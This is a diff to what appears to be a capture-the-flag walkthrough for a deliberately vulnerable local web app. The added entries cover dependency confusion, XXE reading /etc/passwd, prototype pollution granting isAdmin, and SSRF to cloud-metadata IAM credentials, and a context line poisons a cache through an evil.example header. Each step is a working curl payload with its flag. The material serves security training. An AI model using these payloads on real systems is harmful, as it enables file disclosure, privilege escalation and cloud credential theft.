@@ -473,3 +473,34 @@ An unkeyed `X-Forwarded-Host` is reflected into a cacheable response — poison 
 curl -s localhost:4060/promo-banner.css -H 'x-forwarded-host: evil.example/"><script>x</script>'  # primes cache
 curl -s localhost:4060/promo-banner.css   # served from cache → FLAG{lj_cache_poison_deface}
 ```
+
+---
+
+# v7 — Composer (supply-chain / cross-protocol)
+
+### 56. Dependency confusion · `GET /api/sbom`
+SBOM names internal packages that are UNCLAIMED on the public registry (squat them, higher version wins):
+```bash
+curl -s localhost:4060/api/sbom   # juice-internal-utils / lj-billing-sdk → FLAG{lj_dependency_confusion}
+```
+
+### 57. XXE — external entity file read · `POST /api/import/xml`
+`SYSTEM "file://…"` entities are resolved:
+```bash
+curl -s localhost:4060/api/import/xml -H 'content-type: application/json' \
+  -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>"}'   # FLAG{lj_xxe_file_read}
+```
+
+### 58. Prototype pollution · `POST /api/prefs`
+Unsafe recursive merge with no `__proto__` guard; a gadget then reads `isAdmin` off the prototype:
+```bash
+curl -s localhost:4060/api/prefs -H 'content-type: application/json' \
+  -d '{"prefs":{"__proto__":{"isAdmin":true}}}'   # FLAG{lj_prototype_pollution}
+```
+
+### 59. SSRF → cloud metadata credentials · `POST /api/import-avatar`
+Reaching `169.254.169.254` returns (simulated) IAM credentials:
+```bash
+curl -s localhost:4060/api/import-avatar -H 'content-type: application/json' \
+  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/role"}'   # FLAG{lj_ssrf_cloud_metadata_creds}
+```
